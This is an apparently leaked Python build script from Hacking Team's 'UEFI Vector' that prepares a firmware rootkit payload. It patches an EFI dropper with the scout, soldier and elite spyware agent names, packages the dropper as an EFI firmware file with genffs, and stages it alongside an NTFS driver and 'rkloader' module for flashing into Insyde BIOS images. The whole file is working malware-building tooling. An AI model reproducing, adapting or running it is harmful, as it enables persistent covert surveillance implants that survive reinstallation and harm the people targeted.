#################################################################################
#
#    CONFIDENTIAL CODE - DISTRIBUTION OR REPRODUCTION IS STRICTLY FORBIDDEN
#
#################################################################################

# DO NOT MODIFY THIS FILE

import os, sys, struct, datetime, traceback
import warnings
from ctypes import *
import subprocess

if "." not in sys.path: sys.path.append(".")

DESCRIPTION = "VECTOR-UEFI"
VERSION = "1.0"

destfolder = ""

INFO = 0
WARNING = 1
ERROR = 2

documentation = "]HackingTeam[ UEFI Vector - Release 9.5"

# Error routine
def error(level, msg):
	code = "ERROR"
	
	if level == 0:
		code = "INFO"
	elif level == 1:
		code = "WARNING"
	elif level == 2:
		code = "ERROR"
	
	df = open(os.path.join(destfolder, "error"), "a")
	msg = "[{0} {1} {2} \n".format(code, datetime.datetime.now().isoformat()[:19].replace("T", " "), msg)
	print msg
	df.write(msg)
	traceback.print_exc(file=df)
	df.close()

class Insyde():
	def __init__(self):
		self.dll = cdll.LoadLibrary("insyde.dll")
		self.arch = "UNSUPPORTED"
		self.recovery = "UNKNOWN"
	
	def RecoveryInFD(self, FDVolume):
		fdfile = c_char_p(FDVolume)
		recoveryname = create_string_buffer(128)
		archname = create_string_buffer(32)
		
		if self.dll.RecoveryInFD(fdfile, archname, recoveryname) == 0:
			return False
		
		self.arch = archname.value
		self.recovery = recoveryname.value
	
	def LoadIsFlash(self, filename):
		size = c_int()
		size.value = 0
		
		if self.dll.GetBiosImage(filename, None, byref(size)) == False:
			return 0
		
		print "size: %d "%(size.value)
		return size.value
	
	def ExractBiosImage(self, filename, s):
		#
		buff = (c_ubyte * s)()
		size = c_int()
		size.value = s
		self.dll.GetBiosImage(filename, byref(buff), byref(size))
		
		return buff
	
	def ReplaceBiosImage(self, filename, newfileimage, size):
		#
		c_size = c_int()
		
		self.dll.SetBiosImage(filename, newfileimage)
		
		return True
	
	def Architecture(self):
		return self.arch
	
	def RecoveryName(self):
		return self.recovery
	
	def Patch(self, dropperfile, scoutfile, scoutname, soldiername, elitename):
		c_dropperfile = create_string_buffer(dropperfile)
		c_scoutfile = create_string_buffer(scoutfile)
		c_scoutname = create_string_buffer(scoutname)
		c_soldiername = create_string_buffer(soldiername)
		c_elitename = create_string_buffer(elitename)
		
		if self.dll.PatchDropper(byref(c_dropperfile), byref(c_scoutfile), byref(c_scoutname), byref(c_soldiername), byref(c_elitename)) == False:
			return False
		
		return True
	
if __name__=='__main__':
	
	
	print "Arguments in command line %d" %(len(sys.argv))
	
	for i in range(len(sys.argv)):
		print "Param %d : %s" %(i, sys.argv[i])
	
	if len(sys.argv) != 6:
		print "[ERROR] %s require 5 parameters"%(DESCRIPTION)
		print "[-INFO] scout.exe scoutname soldiername elitename outputdir"
		sys.exit(0)
	
	destfolder = sys.argv[5]
	
	if os.path.exists(destfolder) == False:
		os.makedirs(destfolder)
	
	bios = Insyde()
	
	os.system("copy /y dropper.mod dropper.tmp")
	print "Patching EFI Application"
	bios.Patch("dropper.tmp", sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
		
	#error(INFO, "{0} supported.".format(sys.argv[1]))
	#error(INFO, "{0} is {1} - FileName {2} ".format(sys.argv[1], bios.Architecture(), bios.RecoveryName() ) )
	#os.system("copy /y x64file2.mod x64file2.tmp")
	#os.system(" -o dropper -t EFI_FV_FILETYPE_APPLICATION -g eaea9aec-c9c1-46e2-9d52-432ad25a9b0b -s -a 1 -i dropper.tmp")
	
	p = subprocess.Popen(('genffs.exe', "-o", "dropper", "-t", "EFI_FV_FILETYPE_APPLICATION", "-g", "eaea9aec-c9c1-46e2-9d52-432ad25a9b0b", "-s", "-a", "1", "-i", "dropper.tmp"))
	
	p.wait()
	#print "running uefiextract...."
	
	#p = subprocess.Popen(('UEFIextract.exe', os.path.join(destfolder, "firmware"), "x64file0.mod", "x64file1.mod", "dropper"))
	
	#p.wait()

	#print "copy /y %s firmware.fd"%(sys.argv[1])
	
	#os.system("copy /y %s firmware.fd"%(sys.argv[1]))
	#bios.ReplaceBiosImage("firmware.fd", "new.fd", size)
	# load new.fd into firmware
	
	# output file for console
	#outputfile = os.path.join(destfolder, bios.RecoveryName())
	#print "copy /y %s %s"%(sys.argv[1], outputfile)
	
	# transfer "fd" into output folder
	p = subprocess.Popen(('unzip.exe', "-qq", "fd.zip", "-d", destfolder))
	
	p.wait()
	
	print "copy fs driver"
	os.system("copy /y %s %s\\modules"%("ntfs.mod", destfolder))
	print "copy rkloader"
	os.system("copy /y %s %s\\modules"%("rkloader.mod", destfolder))
	print "copy dropper"
	os.system("copy /y dropper %s\\modules\\dropper.mod"%(destfolder))
	
	# clean area
	#os.remove("x64file2.tmp")
	os.remove("dropper")
	os.remove("dropper.tmp")
	#os.remove(os.path.join(destfolder, "firmware"))
	#os.remove("new.fd")
	#os.remove("firmware.fd")
	
	if os.path.exists(os.path.join(destfolder, "error")):
		os.remove(os.path.join(destfolder, "error"))
	
	sys.exit(0)
